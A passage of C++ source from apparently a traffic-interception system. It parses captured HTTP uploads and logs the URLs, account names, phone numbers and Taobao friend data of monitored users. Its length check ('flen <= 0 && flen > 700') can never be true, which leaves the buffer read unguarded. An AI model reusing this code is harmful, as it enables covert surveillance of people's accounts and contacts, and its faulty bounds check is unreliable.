			WriteLog(HTTPPRO, "http拆解开始, 内置规则 %d 条, 用户规则 %d 条",
				v_GenKeyList.size(), v_CustUrlList[buid].size());
			bSplitHttpup = TRUE;
		}

		// 开始读取文件
		int flen = GetFileLength(pSion->m_realfname);
		if(flen <= 0 && flen > 700)
		{
			return;
		}

		char* pSplitxt = pSion->m_dceprocotol->m_CHUNKBUFFER;
		memset(pSplitxt, 0, 8);
		FILE * fs=0;
		fs=fopen(pSion->m_realfname, "rb");
		if(fs != NULL)
		{
			UINT readsize = 0;
			readsize = fread(pSplitxt, 1, flen, fs);
			fclose(fs);
			memset(pSplitxt + readsize, 0, 8);
		}
		else
		{
			return;		// 文件打开失败
		}

		CString strCrc32;
		PostFieldinfoList outlist;
		CString strCrcBase;
		DWORD rSplit = SplitHttpup(url, pSplitxt, strCrcBase, outlist);
		if(rSplit)
		{
			DWORD dwURL = g_crc32Calc.GetCRC(url, url.GetLength());
			if(rSplit & 0xF00)	// 注册类, 记全串
			{
				strCrc32.Format("%08X_%08X", dwURL, g_crc32Calc.GetCRC(pSplitxt, strlen(pSplitxt)));
			}
			else
			{
				strCrc32.Format("%08X_%08X", dwURL, g_crc32Calc.GetCRC(strCrcBase, strCrcBase.GetLength()));
			}

			// Httpup 拆解活动历史
			HistoryRecord hisRec;
			CStringArray arrWebidRec;//arrHisRec,arrWebfigRec;
// 			pSion->GetHisStr(pro, pro, &hisRec, g_httpMissObj);
			pSion->GetWebidStr(pro, pro, &hisRec, pSion->m_dceprocotol->m_httpMissObj);
 			hisRec.SetRecord(IDX_FORWTYPE,	"1");
			hisRec.SetRecord(IDX_URL,		url);
			hisRec.SetRecord(IDX_DOMAIN,	GetDomain(url));
			hisRec.SetRecord(IDX_CRCID,		strCrc32);
			hisRec.SetRecord(IDX_COUNT,		"1");

			hisRec.SetRecord(IDX_ACCOUNT1,	pSion->m_AuthInfo.m_UserAccount1);
			hisRec.SetRecord(IDX_PHONE1,	pSion->m_AuthInfo.m_Phone1);
			hisRec.SetRecord(IDX_ACCOUNT2,	pSion->m_AuthInfo.m_UserAccount2);
			hisRec.SetRecord(IDX_PHONE2,	pSion->m_AuthInfo.m_Phone2);

			if(bhttpproxy)
				hisRec.SetRecord(IDX_IFAGENT, "1");	// http代理

			if(GetHttpupHisRecArray(outlist, hisRec, arrWebidRec,pSion))//arrHisRec, arrWebfigRec))
			{
				if(arrWebidRec.GetSize() > 0)
					WriteArrToData(HTTP_PROTOCOL, WEBID_DATA, "", &arrWebidRec);
// 				if(arrHisRec.GetSize() > 0)
// 					WriteArrToData(HTTP_PROTOCOL, HISTORY_DATA, "", &arrHisRec);
// 				if (arrWebfigRec.GetSize() > 0)
// 				{
// 					WriteArrToData(HTTP_PROTOCOL, WEBFIG_DATA, "", &arrWebfigRec);
// 				}
			}
		}	// end if 拆解成功


		//拆解淘宝的获得好友信息
//		FormatTaobaoFrient(url, pSplitxt,pSion);
		if (!host.IsEmpty())
		{
			FormatTaobaoFrient(packh,url,pSplitxt,pSion->m_spyaddr,host,pSion);
		}
//		FormatTaobaoLogin(packh,url,pSplitxt);淘宝登录是多包，不在此处处理了
	}
	catch (...)
	{
		WriteLog(HTTPPRO, "SplitHttpupToHis() Error");
	}
}
void SplitHttpDownToHis(CString url,
					CString contenttype,
					HttpSession* pSion)
{
	try
	{
		// 首先判断是否需要拆解
// 		if ((!v_statHttpup) || (contenttype.CompareNoCase("application/x-www-form-urlencoded")!=0))
// 		{
// 			return;	// 拆解开关未打开或类型不对
// // 		}

		static BOOL bSplitHttpup = TRUE;
		long buid = v_CustUrlAccID;
		if(v_GenKeyList.size() == 0 && v_CustUrlList[buid].size() == 0)
		{
			if(bSplitHttpup)
			{
				WriteLog(HTTPPRO, "http拆解停止, 未发现内置规则和用户规则");
				bSplitHttpup = FALSE;
			}
			return;
		}
		if(!bSplitHttpup)
		{
			WriteLog(HTTPPRO, "http拆解开始, 内置规则 %d 条, 用户规则 %d 条",
				v_GenKeyList.size(), v_CustUrlList[buid].size());
			bSplitHttpup = TRUE;
		}


		CString strCrc32;
		PostFieldinfoList outlist;
		CString strCrcBase;
		DWORD rSplit = SplitHttpDown(url,  strCrcBase, outlist);
		if(rSplit)
		{

			// Httpup 拆解活动历史
			HistoryRecord hisRec;
			CStringArray arrWebidRec;//arrHisRec,arrWebfigRec;
// 			pSion->GetHisStr(pro, pro, &hisRec, g_httpMissObj);
			pSion->GetWebidStr("httpdown", "httpdown", &hisRec, pSion->m_dceprocotol->m_httpMissObj);
 			hisRec.SetRecord(IDX_FORWTYPE,	"1");
			hisRec.SetRecord(IDX_URL,		url);
			hisRec.SetRecord(IDX_DOMAIN,	GetDomain(url));
			hisRec.SetRecord(IDX_CRCID,		strCrc32);
			hisRec.SetRecord(IDX_COUNT,		"1");

			hisRec.SetRecord(IDX_ACCOUNT1,	pSion->m_AuthInfo.m_UserAccount1);
			hisRec.SetRecord(IDX_PHONE1,	pSion->m_AuthInfo.m_Phone1);
			hisRec.SetRecord(IDX_ACCOUNT2,	pSion->m_AuthInfo.m_UserAccount2);
			hisRec.SetRecord(IDX_PHONE2,	pSion->m_AuthInfo.m_Phone2);


			if(GetHttpupHisRecArray(outlist, hisRec, arrWebidRec,pSion))//arrHisRec, arrWebfigRec))
			{
				if(arrWebidRec.GetSize() > 0)
					WriteArrToData(HTTP_PROTOCOL, WEBID_DATA, "", &arrWebidRec);
			}
		}	// end if 拆解成功


	}
	catch (...)
	{
		WriteLog(HTTPPRO, "SplitHttpdownToHis() Error");
	}
}



